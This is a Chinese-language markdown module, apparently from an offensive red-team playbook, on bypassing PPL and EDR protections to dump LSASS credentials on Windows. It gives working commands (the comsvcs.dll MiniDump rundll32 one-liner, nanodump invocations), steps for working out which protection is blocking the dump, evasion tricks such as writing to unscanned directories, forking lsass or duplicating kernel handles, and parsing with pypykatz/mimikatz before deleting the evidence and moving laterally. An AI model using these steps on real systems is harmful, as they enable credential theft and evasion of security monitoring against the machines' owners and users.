# Credential Access 的端点绕过

“拿到什么 hash/ticket”属于 `/creds`。本文件只解决：**dump/读 LSASS/SAM 的动作被 PPL/EDR/句柄保护拦住**。

成功：原来的 dump 现在能出文件。然后回原模块或交给操作者选 `/creds`。

---

## 1. 先确认拦的是哪一层

```powershell
Get-Process lsass
# OpenProcess 失败 / 0x5 → PPL 或 EDR 句柄保护
# dump 写出后立刻被删 → 落地扫描 → static-payload.md
# 进程一碰 lsass 就被杀 → 行为规则 → 换间接 dump / 内核句柄
```

```text
RunAsPPL / PPL-WinTcb
EDR mini-filter on lsass handles
Defender Credential Guard（LSASS 里没有明文可 dump）
```

Credential Guard 开着时，用户态 LSASS dump **拿不到** 被隔离的机密。这不是 EDR bypass 能解决的，记下来交给 `/creds` 走其他材料（SSP、票据、DPAPI）。

---

## 2. nanodump / 间接 dump

```text
# 公开：github.com/fortra/nanodump
# 用 syscall + 少打开 lsass 的方式写 dump
nanodump.exe -w C:\Windows\Temp\lsass.dmp
```

写出路径尽量用原 Attack 模块已经能写的地方。被拦就改：

```text
写到未扫描目录 / 命名管道 / 不落地直接解析
fork lsass 再 dump 子进程（某些版本）
```

---

## 3. comsvcs MiniDump（高噪声，靶场仍常用）

```cmd
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
```

现代 EDR 几乎必拦。能过就过；不过立刻换 nanodump/syscall，不要反复打这条。

---

## 4. PPL

用户态 OpenProcess(lsass) 被拒：

```text
用已有 SYSTEM + 能绕 PPL 的工具（nanodump 的 PPL 选项，以当前 -h 为准）
或 kernel 句柄复制（kernel-edr.md，高影响）
```

不要为了 dump 无脑 BYOVD。先试用户态间接 dump。

---

## 5. 成功

```text
After: dump 文件存在且 pypykatz/mimikatz 能解析
Restore: 删除 dump
Resume: /creds 或原 Attack 模块继续横向
```
